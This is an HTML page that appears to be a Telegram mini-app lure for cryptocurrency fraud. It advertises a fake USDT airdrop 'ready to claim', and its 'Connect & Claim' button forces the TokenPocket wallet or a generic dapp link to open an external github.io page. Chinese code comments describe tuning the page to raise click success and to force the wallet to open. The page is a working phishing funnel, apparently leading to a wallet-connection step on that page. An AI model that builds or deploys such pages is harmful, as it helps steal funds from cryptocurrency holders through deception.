<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIRDROP TERMINAL</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        #terminal {
            width: 90%;
            border: 2px solid #ff0000;
            padding: 20px;
            box-shadow: 0 0 15px #ff0000;
            background: rgba(20, 0, 0, 0.8);
        }
        .btn {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            text-transform: uppercase;
            box-shadow: 0 0 10px #ff0000;
        }
        .glitch {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div id="terminal">
        <h2>> SYSTEM: AIRDROP_DETECTED</h2>
        <p>> STATUS: READY_TO_CLAIM</p>
        <p>> TOKEN: USDT (TRC-20)</p>
        <p id="wallet-addr">> WALLET: NOT CONNECTED</p>
    </div>
    <button class="btn glitch" onclick="connectAndClaim()">Connect & Claim</button>

<script>
    // 1. 初始化 Telegram 环境
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand(); // 让页面全屏，增加点击成功率

    function connectAndClaim() {
    tg.HapticFeedback.notificationOccurred('success');
    const terminal = document.getElementById('terminal');

    // 你的准确网址
    const myUrl = "https://patrickdafhao-code.github.io/cook/";

    // 方案 A：TokenPocket 最标准的协议格式
    const tpLink = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": myUrl}));
    
    // 方案 B：通用的 DApp 唤起协议 (很多钱包都识别)
    const dappLink = "dapp://" + myUrl.replace("https://", "");

    terminal.innerHTML += "<p style='color:#0f0'>> [TARGET]: " + myUrl + "</p>";
    terminal.innerHTML += "<p style='color:#ff0'>> [STATUS]: INITIATING_HACK_PROTOCOL...</p>";

    // 核心：强制触发 Telegram 的离开警告
    try {
        // 第一尝试：直接拉起 TP
        tg.openLink(tpLink, { try_browser: true });
        
        // 1.5秒后如果没跳走，尝试通用协议
        setTimeout(() => {
            tg.openLink(dappLink, { try_browser: true });
        }, 1500);
    } catch (e) {
        // 如果 API 报错，直接修改地址（强制弹窗）
        window.location.href = tpLink;
    }
}
</script>
</body>
</html>
